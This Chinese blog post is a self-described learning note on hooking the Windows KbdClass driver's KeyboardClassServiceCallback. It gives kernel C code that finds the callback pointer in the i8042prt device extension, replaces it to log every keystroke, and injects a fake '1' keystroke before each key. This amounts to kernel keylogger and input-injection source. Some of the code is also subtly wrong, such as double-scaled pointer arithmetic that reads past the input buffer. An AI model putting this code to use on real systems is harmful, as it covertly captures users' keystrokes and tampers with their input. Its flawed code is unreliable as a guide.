---
title: Hook KeyboardClassServiceCallback 实现内核态按键记录和模拟
url: 764.html
id: 764
categories:
  - windows驱动
date: 2019-04-2 10:41:34
tags:
  - c
	- windows
	- 内核驱动
---

## 0x1前言

这已经是很老的技术了，但是在windows 10 系统中有些东西不太一样了，直接抄《windows内核安全和驱动开发》上的代码并不能直接运行，所以在这里写一下我的学习记录，希望像我一样的新人少走弯路。

才开始学windows驱动相关知识，比较菜，为了搞清楚这个东西还花了2天时间，如果哪里有地方理解的不对，希望大佬能够不吝指教。

<!-- more -->

## 0x2 键盘驱动的工作过程

KdbClass被称为键盘类驱动，再windows中，类驱动通常是指同一类设备的驱动程序，不管是USB键盘，还是PS/2键盘均使用它，所以在这一层做拦截具有通用性，类驱动之下真正和实际硬件交互的驱动被称为`端口驱动`，具体到键盘，i8042prt是ps/2的键盘端口驱动，usb键盘驱动是Kbdhid。

键盘驱动的主要工作就是当键盘上有按键按下引发中断时，键盘驱动从端口读出按键的扫描码，最终顺利地将它交给在键盘设备栈栈顶等待的那个主功能号是`IRP_MJ_READ`的IRP完成任务，为了实现这个功能，键盘驱动使用了两个循环使用的缓冲区。i8042prt和kbdClass各有一个可以循环使用的缓冲区，缓冲区的每个单元都是`KEYBOARD_INPUT_DATA`结构，用来保存一个扫描码及相关信息。在键盘驱动中，把这个循环使用的缓冲区叫做输入队列（input data queue），i8042prt的那个缓冲区被当作端口键盘输入队列，KdbClass的那个缓冲区被叫做类输入数据队列。

为了使用这个队列，i8042prt驱动生成的设备扩展中也保存着一些指针和计数值：

```
1. PKEYBOARD_INPUT_DATA 类型的InputData，DataIn,DataOut,DataEnd
// InputData 指向输入数据队列的开头
// DataEnd 指向输入数据队列的结尾
// DataIn 指向要进入队列的新数据，被放在队列中的位置
// DataOut 指向出队的数据，被放在队列中的位置
2. ULOGN类型的InputCount
// InputCount 为输入数据队列中数据的个数
```

同时，在KbdClass的自定义设备扩展中，也保存着一些指针和计数值，用来使用它的输入数据队列。名字和类型与上面的数据一样。

## 0x3 端口驱动和类驱动之间的协调

当键盘上一个按键被按下时，产生了一个Make code,引发一个键盘中断，当一个按键被松开时产生一个Break Code，引发键盘中断。键盘中断导致键盘中断服务例程被执行，最终导致i8042prt的`I8042KeyBoardInterruptService`被执行，此函数从端口读出按键的扫描码，放在一个`KEYBOARD_INPUT_DATA`中，将这个`KEYBOARD_INPUT_DATA`放在`i8042prt`的输入数据队列中，一个中断放入一个数据，`DataIn`后移动一格，`InputCount`加1，最后会调用内核API函数`KeInsertQueueDpc`，进行更多处理的延迟过程调用。

在此调用中，会调用上层处理输入的回调函数(也就是KbdClass处理输入数据的函数)，取走i8042prt的输入数据队列中的数据，上层处理输入的回调函数的入口地址放在`i8042prt`驱动的设备扩展中，取走数据之后，相应的`i8042prt`的输入数据队列的`DataOut`相应的后移，`InputCount`相应的减少。

当读请求要求读的数据大小大于或等于`i8042prt`输入数据队列的数据时，读请求的处理函数直接从i8042prt的输入数据队列中读出所有输入数据，不使用KbdClass的输入数据队列，大多数情况是这样的。

当读请求要求读的数据大小小于`i8042prt`输入数据队列的数据时，读请求的处理函数直接从`i8042prt`的输入数据队列中读出它所要求的大小，然后这个读请求被完成。`i8042prt`的输入数据队列中剩余的数据会被放入KbdClass的输入数据队列中，当应用层再次发下来一个读请求的时候，那个读请求直接从KbdClass的输入队列中读取数据，不需要等待。

## 0x4 找到类驱动的回调函数

从上面的流程可以看出，`I8042KeyBoardInterruptService`中调用的类驱动的那个回调函数非常关键，通过Hook这个函数，就可以轻易获取到键盘的输入。

这个回调函数的函数指针存储的位置有如下的规律：

```
1. 这个函数指针保存在i8042生成的某个设备或者某个设备的过滤设备（设备A）的自定义设备扩展中。
2. 这个函数的开始地址应该在内核模块KdbClass中。
3. 内核模块KdbClass生成的某个设备对象（设备B）指针也保存在那个设备（设备A）的自定义扩展中，而且在我们要找的函数之前。

// 第四条是我自己添加的,个人感觉就是这样，但是书上都没说

4. 设备B应该绑定在设备A上，也就是 A->AttachedDevice == B
```

根据这四条规则就可以找到回调函数的指针的存储位置。

但是第二条怎么判断是否成立呢？这里说的内核模块不是驱动对象，而是这个内核模块在内核内存空间的地址，其实在驱动对象中`DriverStart`和`DriverSize`分别保存着这个驱动对象所代表的内核模块在内存空间中的开始地址和大小。

可以使用下面的简单代码来判断：

```c
KbdDriverStart = KbdDriverObject->DriverStart;
	KbdDriverSize = KbdDriverObject->DriverSize;

if ((tmp > KbdDriverStart) && (tmp < (UCHAR*)KbdDriverStart + KbdDriverSize) &&
				(MmIsAddressValid(tmp)))
			{
				// 在内核模块中  
			}
```

## 0x5 代码实现

首先需要先定义需要定义这个回调函数的函数`KeyboardClassServiceCallback`原型，在MSDN上可以查到：

```c
typedef VOID(__stdcall *KEYBOARDCLASSSERVICECALLBACK)( 
	// KeyboardClassServiceCallback  定义回调函数类型
	
	/*
	https://docs.microsoft.com/en-us/previous-versions//ff542324(v=vs.85)
	  此回调函数将输入缓冲区的数据传输到类驱动的缓冲队列
	*/
	_In_    PDEVICE_OBJECT       DeviceObject, 
	_In_    PKEYBOARD_INPUT_DATA InputDataStart, // Pointer to the first keyboard input data packet in the input data buffer of the port device
	_In_    PKEYBOARD_INPUT_DATA InputDataEnd,
	// Pointer to the keyboard input data packet that immediately follows the last data packet in the input data buffer of the port device
	_Inout_ PULONG               InputDataConsumed  // Pointer to the number of keyboard input data packets that are transferred by the routine
); 
```

然后需要定义一个自己的数据结构，用来保存回调函数指针和回调函数指针在设备扩展中的位置：

```c
typedef struct _KBD_CALLBACK {
	PDEVICE_OBJECT classDeviceObject;  // 记录设备B
	KEYBOARDCLASSSERVICECALLBACK serviceCallback; // 记录回调函数的函数指针
	PVOID *AddrServiceCallback;  // 记录回调函数在驱动扩展中存储的位置
} KDB_CALLBACK,*PKDB_CALLBACK;

KDB_CALLBACK gkdbCallback = { 0 }; // 全局变量
```

在进行搜索之前，需要先获得KbdClass驱动的驱动对象和端口驱动的驱动对象，用如下代码获得kdbclass的驱动对象：

```c
extern POBJECT_TYPE *IoDriverObjectType; // 其实是个指针，书上写错了
// 是一个全局变量，但是头文件没有

// 这个函数是事实存在的，只是文档中没有公开。声明一下
// 就可以直接使用了。
NTSTATUS
ObReferenceObjectByName(
	PUNICODE_STRING ObjectName,
	ULONG Attributes,
	PACCESS_STATE AccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PVOID ParseContext,
	PVOID *Object
);

NTSTATUS SearchServiceFromKdbExt(PDRIVER_OBJECT KbdDriverObject, PDEVICE_OBJECT pPortDev); 

	// 获取kdbclass的驱动对象，从里面拿到其开始地址和大小 

	RtlInitUnicodeString(&unitNameString, KBD_DRIVER_NAME); 
	status = ObReferenceObjectByName(
		&unitNameString,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		*IoDriverObjectType,
		KernelMode,
		NULL,
		&kbdDriverObject
	);
	if (!NT_SUCCESS(status)) {
	   // 如果没有成功，就直接返回失败即可
		DbgPrint("Couldn't get the kbd driver Object!\n"); 
		return STATUS_UNSUCCESSFUL;
	}
	else {
		ObDereferenceObject(kbdDriverObject);

		// 记录 kbdclass驱动的起始地址和大小
		kbdDriverStart = kbdDriverObject->DriverStart; 
		DbgPrint("The kbdDriver address is %p\n",kbdDriverObject);
		kbdDriverSize = kbdDriverObject->DriverSize;
		DbgPrint("The kbdDriver size is %d\n", kbdDriverSize);
	}

```

下面就是搜索回调函数的地址了，思路是先找到端口驱动对象，然后遍历它的所有设备对象，对于每一个设备对象都调用一个函数进行搜索：

```c
UsingDeviceObject = UsingDriverObject->DeviceObject;
//UsingDriverObject 是端口驱动对象	
while (UsingDeviceObject) {
		status = SearchServiceFromKdbExt(kbdDriverObject, UsingDeviceObject);
		if (status == STATUS_SUCCESS) {
			break;
		}
		UsingDeviceObject = UsingDeviceObject->NextDevice; // 遍历设备对象
	}
```

`SearchServiceFromKdbExt`函数的实现思路是：先根据第4条，遍历端口驱动的设备对象及绑定在上面的过滤设备对象，先找到设备A。 然后再遍历KdbClass驱动的设备对象，找到设备B。接着根据第三条，找到设备扩展中存储设备B指针的位置，然后根据第1和第2条，找到回调函数的指针及其在设备扩展中的位置。

```c
NTSTATUS SearchServiceFromKdbExt(PDRIVER_OBJECT KbdDriverObject, PDEVICE_OBJECT pPortDev)
{
	PDEVICE_OBJECT pTargetDeviceObject = NULL;
	UCHAR *DeviceExt;
	int i = 0;
	NTSTATUS status;
	PVOID KbdDriverStart;
	ULONG KbdDriverSize = 0;
	PDEVICE_OBJECT  pTmpDev;
	UNICODE_STRING  kbdDriName;

	KbdDriverStart = KbdDriverObject->DriverStart;
	KbdDriverSize = KbdDriverObject->DriverSize;

	status = STATUS_UNSUCCESSFUL;

	RtlInitUnicodeString(&kbdDriName, L"\\Driver\\kbdclass");
	pTmpDev = pPortDev;
	while (pTmpDev->AttachedDevice != NULL)
	{
		KdPrint(("Att:  0x%x", pTmpDev->AttachedDevice));
		KdPrint(("Dri Name : %wZ", &pTmpDev->AttachedDevice->DriverObject->DriverName));
		if (RtlCompareUnicodeString(&pTmpDev->AttachedDevice->DriverObject->DriverName,
			&kbdDriName, TRUE) == 0)
		{
			break;
		}
		pTmpDev = pTmpDev->AttachedDevice;
	}
	if (pTmpDev->AttachedDevice == NULL)
	{
		return status;
	}

	pTargetDeviceObject = KbdDriverObject->DeviceObject;
	while (pTargetDeviceObject)
	{
		if (pTmpDev->AttachedDevice != pTargetDeviceObject)
		{
			pTargetDeviceObject = pTargetDeviceObject->NextDevice;
			continue;
		}
		DeviceExt = (UCHAR *)pTmpDev->DeviceExtension;
		
		//遍历我们先找到的端口驱动的设备扩展的每一个指针  
		for (i = 0; i < 4096; i++, DeviceExt++)
		{
			PVOID tmp;
			if (!MmIsAddressValid(DeviceExt))
			{
				break;
			}
			//找到后会填写到这个全局变量中，这里检查是否已经填好了  
			//如果已经填好了就不用继续找了，可以直接退出  
			if (gkdbCallback.classDeviceObject && gkdbCallback.serviceCallback)
			{
				status = STATUS_SUCCESS;
				break;
			}
			//在端口驱动的设备扩展里，找到了类驱动设备对象，填好类驱动设备对象后继续  
			tmp = *(PVOID*)DeviceExt;
			if (tmp == pTargetDeviceObject)
			{
				gkdbCallback.classDeviceObject = pTargetDeviceObject;
				continue;
			}

			//如果在设备扩展中找到一个地址位于KbdClass这个驱动中，就可以认为，这就是我们要找的回调函数  
			if ((tmp > KbdDriverStart) && (tmp < (UCHAR*)KbdDriverStart + KbdDriverSize) &&
				(MmIsAddressValid(tmp)))
			{
				//将这个回调函数记录下来  
				DbgPrint("KEYBOARDCLASSSERVICECALLBACK address: %p", tmp);
				gkdbCallback.serviceCallback = (KEYBOARDCLASSSERVICECALLBACK)tmp;
				gkdbCallback.AddrServiceCallback = (PVOID *)DeviceExt;
			}
		}
		if (status == STATUS_SUCCESS)
		{
			break;
		}
		//换成下一个设备，继续遍历  
		pTargetDeviceObject = pTargetDeviceObject->NextDevice;
	}
	return status;
}
```

看网上很多代码都是在找到`KeyboardClassServiceCallback`回到函数的地址之后采用inline hook的方式进行键盘记录，其实没必要那么复杂，直接替换掉驱动扩展里面的函数指针为我们自己的函数，就可以实现键盘记录了：

```c
	if (gkdbCallback.serviceCallback && gkdbCallback.AddrServiceCallback) {
	   // 如果找到了回调函数，就修改掉回调函数
		DbgPrint("Replace the keyboardClassCallback to mycallback!\n");
	    *gkdbCallback.AddrServiceCallback = mycallback;

	}
```

我们自己的回调函数如下：

```c
VOID __stdcall mycallback( // 定义回调函数
	_In_    PDEVICE_OBJECT       DeviceObject,
	_In_    PKEYBOARD_INPUT_DATA InputDataStart,
	_In_    PKEYBOARD_INPUT_DATA InputDataEnd,
	_Inout_ PULONG               InputDataConsumed
) {
	DbgPrint("mycall back run.");
	DbgPrint("Send %d input data packets data this time.",*InputDataConsumed);

	DbgPrint("The first PKEYBOARD_INPUT_DATA address is %p.", InputDataStart);

	DbgPrint("The last PKEYBOARD_INPUT_DATA address is %p.", InputDataEnd);
	for (int i = 0; i < (InputDataEnd- InputDataStart); i++) {
	    
		DbgPrint("The Scancode : %d,key %s\n", (InputDataStart + i * sizeof(KEYBOARD_INPUT_DATA))->MakeCode, (InputDataStart + i * sizeof(KEYBOARD_INPUT_DATA))->Flags ? "Up":"Down");
	}
	
	return gkdbCallback.serviceCallback(DeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);
}
```

#### 内核态按键模拟

我们只需要手工调用`KeyboardClassServiceCallback`这个函数，就可以进行按键模拟了，为了简单，我直接在自己写的回调函数中加了一个例子：

```c
VOID __stdcall mycallback( // 定义回调函数
	_In_    PDEVICE_OBJECT       DeviceObject,
	_In_    PKEYBOARD_INPUT_DATA InputDataStart,
	_In_    PKEYBOARD_INPUT_DATA InputDataEnd,
	_Inout_ PULONG               InputDataConsumed
) {
	DbgPrint("mycall back run.");
	DbgPrint("Send %d input data packets data this time.",*InputDataConsumed);

	DbgPrint("The first PKEYBOARD_INPUT_DATA address is %p.", InputDataStart);

	DbgPrint("The last PKEYBOARD_INPUT_DATA address is %p.", InputDataEnd);
	for (int i = 0; i < (InputDataEnd- InputDataStart); i++) {
	    
		DbgPrint("The Scancode : %d,key %s\n", (InputDataStart + i * sizeof(KEYBOARD_INPUT_DATA))->MakeCode, (InputDataStart + i * sizeof(KEYBOARD_INPUT_DATA))->Flags ? "Up":"Down");
	}

	// 主动调用回调函数，发送一个 1 的按键消息 
	KEYBOARD_INPUT_DATA fakeKey = *InputDataStart; 
	fakeKey.MakeCode = 2; // 按键 1 的scancode 是 2
	PKEYBOARD_INPUT_DATA fakeInputDataStart = &fakeKey;
	PKEYBOARD_INPUT_DATA fakeInputDataEnd = fakeInputDataStart + 1 ;
	ULONG fakeInputDataConsumed = 0; 
	gkdbCallback.serviceCallback(DeviceObject,fakeInputDataStart,fakeInputDataEnd,&fakeInputDataConsumed);

	return gkdbCallback.serviceCallback(DeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);
}
```

这样产生的效果是，无论我们按什么键，都会在前面加个1，比如我们输入`abc`，系统得到其实是`1a1b1c`。











